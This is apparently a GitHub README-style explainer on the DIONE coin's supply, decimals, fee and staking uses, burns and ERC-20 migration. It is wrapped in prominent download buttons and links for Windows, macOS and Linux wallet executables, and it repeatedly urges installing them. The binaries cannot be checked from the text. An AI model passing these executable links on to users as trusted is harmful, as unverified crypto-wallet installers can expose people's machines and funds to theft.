![DIONE Wallet](assets/banner-article.png)

# DIONE Coin Tokenomics Explained

<p align="center">Supply, decimals and what the token pays for</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="assets/button-windows.png" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

DIONE is the native asset of Odyssey Chain, with a total supply of 13,433,600,526 and 18 decimals. It pays for every transaction on the chain, it is what validators and delegators stake, and it moved 1:1 from an ERC-20 token at launch. There is no burn mechanism in the published material.

## The headline figures

| Property | Value |
| --- | --- |
| Total supply | 13,433,600,526 DIONE |
| Decimals | 18 |
| Role | native asset: fees and staking |
| Origin | ERC-20 on Ethereum, migrated 1:1 at launch |
| Chain | Odyssey Chain, ID 153153 |

Two cautions belong beside those numbers. Circulating supply is reported differently by different trackers, and the explorer is the authority rather than any aggregator. And a total supply figure is not a market capitalisation, because it says nothing about price.

## What the token is for

Four uses, in order of how much they matter:

**Fees.** Every transaction on Odyssey Chain costs DIONE: transfers, delegations, claims, approvals, swaps. This is the use that makes the asset necessary rather than optional.

**Staking.** Validators bond DIONE, and delegators attach theirs to a validator's stake. The 10,000 DIONE minimum, the 1% base reward per 30-day period and the 10-day unbonding period are all denominated in it.

**Settlement.** Applications built on the chain, including the energy marketplace, settle in the native asset.

**Holding and transfer.** The ordinary use: sending value to someone else, which on a chain means paying a fee in the same asset.

[What You Can Do With DIONE Coin](https://github.com/dione-protocol/keys-and-transfers/blob/main/what-can-you-do-with-dione-coin.md) expands each of these.

## A fixed supply, honestly described

The total supply is fixed at 13,433,600,526. Nothing in the published material describes a mechanism that destroys tokens, and nothing describes an ongoing issuance that would raise the total.

That combination has a specific implication: the supply is not elastic. Staking rewards are paid within the programme's terms rather than by minting an ever-growing balance, and the annual maximum of 8% is a ceiling on the reward rate rather than a claim about supply.

## Is DIONE deflationary?

No, on the published record. A deflationary asset has a mechanism that permanently removes supply, usually by burning fees or tokens; DIONE has no such mechanism documented, and its total supply is a fixed figure.

That is a description of the token's design rather than a judgement about it. Deflation is one design choice among several, and a chain that does not burn fees is not thereby worse; it simply makes a different trade.

## Does DIONE have token burns?

There is no token burn in the published material. Fees are paid to the network's validators as part of block production rather than destroyed, which is the ordinary arrangement on a chain whose security depends on fee revenue.

If you encounter a claim that a burn event happened or is scheduled, treat it as unverified until the project publishes it. A burn is observable on-chain, so it is a claim that can be checked rather than taken on trust - the explorer is where you would check it.

## How much DIONE is staked?

The published material does not give a single figure, and a static number would be wrong within a day anyway. Two places to look instead:

- **The staking dashboard**, which reflects the current validator set and delegations.
- **The explorer**, which shows the chain's own state without an intermediary.

Anyone quoting a staked percentage should say when they measured it. Without a date, the figure is a guess dressed as a fact.

## What the tokenomics do not say

Three things readers often expect and will not find here:

**No price implication.** Supply and utility are not a valuation. A fixed supply with real fee demand can still trade at any price, and nothing in this article predicts one.

**No distribution schedule.** Who holds what, and on what vesting terms, is a separate question from what the token is for, and it is not answered by a supply figure.

**No yield promise.** The staking rate is published, but it depends on the validator you choose and on staying bonded; it is a programme term rather than an entitlement, set by the chain described in [How Odyssey Chain Powers DIONE](https://github.com/dione-protocol/staking-and-network/blob/main/how-odyssey-chain-powers-dione.md).

## Why 18 decimals matters

Decimals decide how the smallest unit is represented. With 18, one DIONE is 10^18 base units, the same convention Ethereum uses, which is why EVM tooling handles DIONE without special cases.

Practically it matters in two places: sending an amount that rounds to zero (impossible at these decimals for any realistic transfer), and reading raw values from a contract or an API, where the number appears multiplied by 10^18 and has to be scaled back.

## The migration's effect on supply

The move from ERC-20 to native was 1:1, so it did not change what a holder owned: ten thousand tokens became ten thousand tokens. What changed was the chain they live on and the rules that apply to them.

That is why supply figures from before and after launch are comparable, and why a discrepancy between an old listing and the current one is a data problem rather than a change in supply. [Migrate DIONE From ERC-20 to Odyssey Chain](https://github.com/dione-protocol/keys-and-transfers/blob/main/migrate-dione-from-erc20-to-odyssey.md) covers the conversion.

## Where to verify what matters

Three sources, in order of authority: the explorer for chain state, the staking dashboard for delegation, and the project's own documentation for programme terms. Prices come from exchanges, and each exchange is its own market.

Reading the token through those three keeps the numbers honest, and it is the habit that makes claims checkable rather than repeatable.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

The wallet displays balances and tracks staking rewards, so a build that is behind can make supply-side facts look wrong when the display is the problem. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before reconciling figures.

## FAQ

### What is the total supply of DIONE?

13,433,600,526 DIONE, with 18 decimals. Circulating supply is reported differently by different trackers, so the explorer is the better source.

### What is DIONE coin used for?

Paying fees on Odyssey Chain, staking and delegation, settling applications built on the chain, and ordinary transfers.

### Is DIONE deflationary?

No on the published record: there is no documented burn mechanism, and the total supply is a fixed figure.

### Does DIONE have token burns?

No burn mechanism is documented. Fees go to block production, and any burn claim can be checked on the explorer.

### How much DIONE is staked?

No single published figure. Check the staking dashboard or the explorer, and note the date of any number you quote.

Supply and utility are the checkable half of tokenomics, and price is the half nobody can check in advance. The token's uses are in [What You Can Do With DIONE Coin](https://github.com/dione-protocol/keys-and-transfers/blob/main/what-can-you-do-with-dione-coin.md), the staking terms in [DIONE Staking Rewards Explained](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-rewards-explained.md), and the protocol behind it in [What Is DIONE Protocol?](https://github.com/dione-protocol/staking-and-network/blob/main/what-is-dione-protocol.md).
